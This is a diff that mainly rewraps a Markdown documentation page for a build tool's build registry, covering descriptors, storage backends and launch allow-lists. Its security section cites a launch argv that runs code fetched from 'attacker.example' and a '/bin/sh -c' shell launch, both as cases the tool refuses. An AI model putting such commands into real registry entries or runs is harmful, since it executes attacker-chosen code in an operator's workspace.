@@ -1,8 +1,8 @@
 # The build registry
 
 The **build registry** is a catalog of the pipelines (builds) that exist and
-where they live. Where [durable run state](./state.md) records *runs*, the
-registry records *builds*: each build registers a small **descriptor** — its id,
+where they live. Where [durable run state](./state.md) records _runs_, the
+registry records _builds_: each build registers a small **descriptor** — its id,
 its CLI surface (targets, parameters, commands), and how to launch it — into a
 pluggable store.
 
@@ -13,9 +13,10 @@ discoverable — and runnable — through an already-running server (see
 [Registry mode](./mcp.md#registry-mode-dynamic-discovery)).
 
 The registry is a **separate concern** from the run [`StateStore`](./state.md) —
-a run history and a build catalog are different things — but it is configured the
-same way and, over HTTP, rides the same [REST contract](./state-api.md#build-catalog-builds)
-with a `/builds` collection beside `/runs`, so one service can host both.
+a run history and a build catalog are different things — but it is configured
+the same way and, over HTTP, rides the same
+[REST contract](./state-api.md#build-catalog-builds) with a `/builds` collection
+beside `/runs`, so one service can host both.
 
 ## Quick start
 
@@ -34,25 +35,25 @@ registrations converge on one record via compare-and-swap.
 ## The build descriptor
 
 A descriptor is a versioned JSON snapshot of one build. It carries only static,
-structural metadata — never parameter *values* — so, like a run record, it
+structural metadata — never parameter _values_ — so, like a run record, it
 excludes secrets by construction.
 
-| Field       | What it is                                                        |
-| ----------- | ---------------------------------------------------------------- |
-| `id`        | Stable build id (the build class name, unless overridden).       |
-| `name`      | Human-facing build name (the class name).                        |
-| `location`  | How to launch the build (see below).                             |
+| Field       | What it is                                                                                                                                |
+| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
+| `id`        | Stable build id (the build class name, unless overridden).                                                                                |
+| `name`      | Human-facing build name (the class name).                                                                                                 |
+| `location`  | How to launch the build (see below).                                                                                                      |
 | `surface`   | The CLI surface — the exact output of `describeCli(build)`: commands, flags, targets (with deps), and parameters (flags only, no values). |
-| `actor`     | Who registered it (resolved from `--actor` / `ZUKE_ACTOR` / CI). |
-| `createdAt` | ISO-8601 first-registration time (preserved across updates).     |
-| `updatedAt` | ISO-8601 time of the latest registration.                        |
+| `actor`     | Who registered it (resolved from `--actor` / `ZUKE_ACTOR` / CI).                                                                          |
+| `createdAt` | ISO-8601 first-registration time (preserved across updates).                                                                              |
+| `updatedAt` | ISO-8601 time of the latest registration.                                                                                                 |
 
 The **location** is one of two forms:
 
 - `{ kind: "module", module, cwd, repo? }` — the entry module `deno run`
   executes (a `file:`/`https:` URL or path), the working directory, and — in CI
-  — the `owner/name` repo slug. This is what `zuke register` writes, derived from
-  the running module, `Deno.cwd()`, and `GITHUB_REPOSITORY`.
+  — the `owner/name` repo slug. This is what `zuke register` writes, derived
+  from the running module, `Deno.cwd()`, and `GITHUB_REPOSITORY`.
 - `{ kind: "command", command, cwd, repo? }` — an explicit tokenised launch argv
   (for a build fronted by a wrapper script). Hand-authored or produced by a
   custom registry; the runner honours it in the same way.
@@ -64,29 +65,29 @@ The **location** is one of two forms:
 > `ZUKE_REGISTRY_LAUNCH_HOSTS` (comma- or space-separated; `*` allows any).
 > Otherwise a registry entry would be enough to run attacker-chosen code with
 > `deno run -A` in the operator's workspace. The allow-list token is the
-> hostname, or the scheme when the specifier carries none (`jsr:`); an allow-listed
-> `http:` origin additionally needs `ZUKE_ALLOW_INSECURE_URL=1`, and loopback
-> needs no such opt-out. A refused launch is a structured tool error and an
-> audited `launch_origin_not_allowed` event — nothing is spawned. Local modules,
-> which is what `zuke register` writes, are unaffected.
+> hostname, or the scheme when the specifier carries none (`jsr:`); an
+> allow-listed `http:` origin additionally needs `ZUKE_ALLOW_INSECURE_URL=1`,
+> and loopback needs no such opt-out. A refused launch is a structured tool
+> error and an audited `launch_origin_not_allowed` event — nothing is spawned.
+> Local modules, which is what `zuke register` writes, are unaffected.
 >
 > **A `command` location is refused the same way**, unless its program is named
 > in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated, since a program path may
 > contain a space; `*` allows any). Its argv is not code already on the machine
-> the way a local module path is — the registry writer picks the program _and its
-> arguments_, so `["deno", "run", "-A", "https://attacker.example/x.ts"]` is the
-> refused module case in command form and `["/bin/sh", "-c", …]` is arbitrary
-> code with no fetch. The entry must match `command[0]` **exactly**, case-folded,
-> and deliberately not by basename: the descriptor chooses the program string, so
-> matching `make` against `/tmp/anywhere/make` would point a trusted name at a
-> file of the writer's own. A refusal names the exact string to add. Listing a
-> program does not license it to fetch: an argument naming a remote specifier
-> still has to pass `ZUKE_REGISTRY_LAUNCH_HOSTS`, so `deno run -A https://…` is
-> refused by origin just as the module form is. What remains is inherent to
-> allow-listing — an approved program with local arguments the writer chose — so
-> prefer absolute programs, and know that listing a shell hands over anything
-> reachable locally. A refusal is an audited `launch_command_not_allowed` (or
-> `launch_origin_not_allowed`) event.
+> the way a local module path is — the registry writer picks the program _and
+> its arguments_, so `["deno", "run", "-A", "https://attacker.example/x.ts"]` is
+> the refused module case in command form and `["/bin/sh", "-c", …]` is
+> arbitrary code with no fetch. The entry must match `command[0]` **exactly**,
+> case-folded, and deliberately not by basename: the descriptor chooses the
+> program string, so matching `make` against `/tmp/anywhere/make` would point a
+> trusted name at a file of the writer's own. A refusal names the exact string
+> to add. Listing a program does not license it to fetch: an argument naming a
+> remote specifier still has to pass `ZUKE_REGISTRY_LAUNCH_HOSTS`, so
+> `deno run -A https://…` is refused by origin just as the module form is. What
+> remains is inherent to allow-listing — an approved program with local
+> arguments the writer chose — so prefer absolute programs, and know that
+> listing a shell hands over anything reachable locally. A refusal is an audited
+> `launch_command_not_allowed` (or `launch_origin_not_allowed`) event.
 
 ## Backends
 
@@ -96,12 +97,13 @@ Two dependency-free backends ship, mirroring the state layer.
 
 Writes one `<id>.json` file per build under a directory (default
 `<repo root>/.zuke/builds`, a sibling of `.zuke/runs` — never colliding).
-Compare-and-swap uses an `O_EXCL` lock marker plus an atomic temp-file rename, so
-two processes registering at once cannot tear a write. Single-host by design.
+Compare-and-swap uses an `O_EXCL` lock marker plus an atomic temp-file rename,
+so two processes registering at once cannot tear a write. Single-host by design.
 
 ### `HttpBuildRegistry` — hosted service
 
-Talks to a hosted service over the [`/builds` REST contract](./state-api.md#build-catalog-builds):
+Talks to a hosted service over the
+[`/builds` REST contract](./state-api.md#build-catalog-builds):
 `GET/PUT/DELETE /builds/:id` and `GET /builds`, with `ETag`/`If-Match`
 compare-and-swap and bearer auth. Its options mirror the state client —
 `{ url, token?, fetch? }` — and it is the production path. Point it only at a
@@ -139,19 +141,19 @@ class CD extends Build {
 A descriptor is secret-free by construction: it is built from
 `describeCli(build)`, which emits only parameter **flags** and their static
 metadata (required, kind, …) — never resolved values — plus a launch location
-and an actor name. `zuke register` resolves no parameter values at all. Two extra
-guards keep declared-but-sensitive strings out: a **secret** parameter's declared
-`.options(...)` values are omitted (they could be real keys), and credentials
-embedded in a remote module URL (`https://user:token@host/build.ts`) are stripped
-from the stored `location.module`. Treat the store as sensitive configuration
-nonetheless (it names your pipelines and where they run), and front an HTTP
-backend with TLS and authn as you would any internal API.
+and an actor name. `zuke register` resolves no parameter values at all. Two
+extra guards keep declared-but-sensitive strings out: a **secret** parameter's
+declared `.options(...)` values are omitted (they could be real keys), and
+credentials embedded in a remote module URL (`https://user:token@host/build.ts`)
+are stripped from the stored `location.module`. Treat the store as sensitive
+configuration nonetheless (it names your pipelines and where they run), and
+front an HTTP backend with TLS and authn as you would any internal API.
 
 ## Extensibility
 
-The whole thing sits behind the `BuildRegistry` interface
-(`getBuild` / `register` / `deregister` / `listBuilds`). A consumer can implement
-it against their own catalog service or database and plug it in via
-`Build.registry()` — the richer catalog stays a plugin, exactly as the pluggable
-`StateStore` and `RemoteCacheStore` do. Core ships the interface, the two
-reference backends, and the `zuke mcp --registry` integration point.
+The whole thing sits behind the `BuildRegistry` interface (`getBuild` /
+`register` / `deregister` / `listBuilds`). A consumer can implement it against
+their own catalog service or database and plug it in via `Build.registry()` —
+the richer catalog stays a plugin, exactly as the pluggable `StateStore` and
+`RemoteCacheStore` do. Core ships the interface, the two reference backends, and
+the `zuke mcp --registry` integration point.
